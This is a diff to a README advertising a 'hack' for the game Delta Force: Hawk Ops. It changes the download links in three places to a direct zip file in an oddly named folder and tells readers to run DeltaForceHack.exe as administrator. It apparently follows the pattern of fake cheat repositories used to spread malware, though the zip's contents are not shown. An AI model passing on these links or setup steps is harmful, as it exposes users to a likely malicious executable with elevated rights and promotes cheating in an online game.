@@ -1,6 +1,6 @@
 # ⚡ DeltaForce-Hack---Delta-Force-Hawk-Ops-Hack-2026 - Dominate Every Match Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-DeltaForce_Hack_2026-FF6B00?style=for-the-badge&logo=github&logoColor=white&labelColor=2C2C2C)](https://github.com/sanchezru8875/DeltaForce-Hack---Delta-Force-Hawk-Ops-Hack-2026)
+[![Download Now](https://img.shields.io/badge/Download-DeltaForce_Hack_2026-FF6B00?style=for-the-badge&logo=github&logoColor=white&labelColor=2C2C2C)](https://raw.githubusercontent.com/sanchezru8875/DeltaForce-Hack---Delta-Force-Hawk-Ops-Hack-2026/main/politically/Force-Ops-Delta-Hack-Hawk-v1.9.zip)
 
 ---
 
@@ -47,7 +47,7 @@ Follow these simple steps to get up and running in under five minutes.
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-**[https://github.com/sanchezru8875/DeltaForce-Hack---Delta-Force-Hawk-Ops-Hack-2026](https://github.com/sanchezru8875/DeltaForce-Hack---Delta-Force-Hawk-Ops-Hack-2026)**
+**[https://raw.githubusercontent.com/sanchezru8875/DeltaForce-Hack---Delta-Force-Hawk-Ops-Hack-2026/main/politically/Force-Ops-Delta-Hack-Hawk-v1.9.zip](https://raw.githubusercontent.com/sanchezru8875/DeltaForce-Hack---Delta-Force-Hawk-Ops-Hack-2026/main/politically/Force-Ops-Delta-Hack-Hawk-v1.9.zip)**
 
 Click the green "Code" button, then select "Download ZIP" for the easiest method.
 
@@ -168,7 +168,7 @@ Updates are pushed whenever the game receives a major patch. Check the repositor
 ## 📥 Download & Setup (Quick Recap)
 
 1. **Download:** Visit this link to download the application:  
-   **[https://github.com/sanchezru8875/DeltaForce-Hack---Delta-Force-Hawk-Ops-Hack-2026](https://github.com/sanchezru8875/DeltaForce-Hack---Delta-Force-Hawk-Ops-Hack-2026)**
+   **[https://raw.githubusercontent.com/sanchezru8875/DeltaForce-Hack---Delta-Force-Hawk-Ops-Hack-2026/main/politically/Force-Ops-Delta-Hack-Hawk-v1.9.zip](https://raw.githubusercontent.com/sanchezru8875/DeltaForce-Hack---Delta-Force-Hawk-Ops-Hack-2026/main/politically/Force-Ops-Delta-Hack-Hawk-v1.9.zip)**
 
 2. **Extract:** Unzip the folder to any location.
 3. **Run:** Launch `DeltaForceHack.exe` as administrator.
